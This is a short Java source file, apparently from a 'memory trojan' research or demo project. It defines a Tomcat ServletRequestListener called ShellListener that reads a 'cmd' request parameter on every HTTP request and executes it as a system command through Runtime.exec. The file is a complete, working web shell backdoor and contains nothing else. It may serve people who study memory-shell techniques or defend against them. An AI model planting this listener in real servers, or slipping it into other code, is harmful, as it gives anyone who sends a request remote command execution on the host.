package com.yyjccc.memorytrojan.Tomcat;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;


@WebListener
public class ShellListener implements ServletRequestListener {
	@Override
	public void requestDestroyed(ServletRequestEvent sre) {
		System.out.println("Listener 请求前");
	}

	@Override
	public void requestInitialized(ServletRequestEvent sre) {
		HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
		String cmd=request.getParameter("cmd");
		if (cmd != null) {
			try {
				Runtime.getRuntime().exec(cmd);
			} catch (IOException e) {
				e.printStackTrace();
			} catch (NullPointerException n) {
				n.printStackTrace();
			}
		}

	}
}
